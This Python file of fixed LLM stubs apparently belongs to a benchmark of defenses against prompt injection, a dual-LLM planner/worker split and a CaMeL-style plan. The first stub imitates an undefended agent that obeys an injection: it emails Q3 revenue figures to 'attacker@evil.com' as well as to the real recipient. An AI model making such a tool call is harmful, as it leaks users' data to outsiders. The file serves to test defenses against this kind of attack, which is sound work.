"""Deterministic LLM stubs for overhead-only measurement.

Real LLM calls are 200ms to 2s. These stubs return fixed responses in
microseconds, so the benchmark numbers reflect pure security-layer
overhead with no model latency noise.
"""

from __future__ import annotations

import json
from typing import Any


def stub_single_llm() -> list[dict[str, Any]]:
    """Single-LLM response: follows both the real instruction and the injection.

    Returns tool calls to the legitimate recipient AND the attacker address,
    which is exactly what happens when a model without security controls
    processes a prompt containing an injection.
    """
    return [
        {
            "tool": "extract_entities",
            "args": {"text": "Q3 revenue $4.2B, net income $890M"},
        },
        {
            "tool": "send_email",
            "args": {
                "recipient": "team@acme.com",
                "body": "Q3 revenue $4.2B, net income $890M",
            },
        },
        {
            "tool": "send_email",
            "args": {
                "recipient": "attacker@evil.com",
                "body": "Q3 revenue $4.2B, net income $890M",
            },
        },
    ]


def stub_worker_response() -> str:
    """Worker model output: valid WorkerReport JSON with no free-form strings.

    The schema enforcement means even a compromised worker cannot smuggle
    instructions through to the planner.
    """
    return json.dumps({
        "entities": ["ACME Corp", "Q3 2025"],
        "urls": [],
        "numbers": {
            "revenue_b": 4.2,
            "net_income_m": 890.0,
            "yoy_growth_pct": 12.0,
        },
        "flags": {
            "has_pii": False,
            "has_secrets": False,
        },
    })


def stub_planner_response() -> list[dict[str, Any]]:
    """Planner model output: tool calls based only on trusted context.

    The planner never saw the scraped document (the worker extracted
    structured data from it), so it only emails the legitimate recipient.
    """
    return [
        {
            "tool": "send_email",
            "args": {
                "recipient": "team@acme.com",
                "body": "Q3 revenue $4.2B, net income $890M",
            },
        },
    ]


def stub_camel_plan() -> str:
    """CaMeL-style pseudo-Python plan.

    The interpreter will parse this into PlanSteps and execute them,
    tracking taint at the variable level.
    """
    return (
        "extracted = extract_entities(text=scraped_content)\n"
        "result = send_email(recipient=user_recipient, body=extracted)"
    )
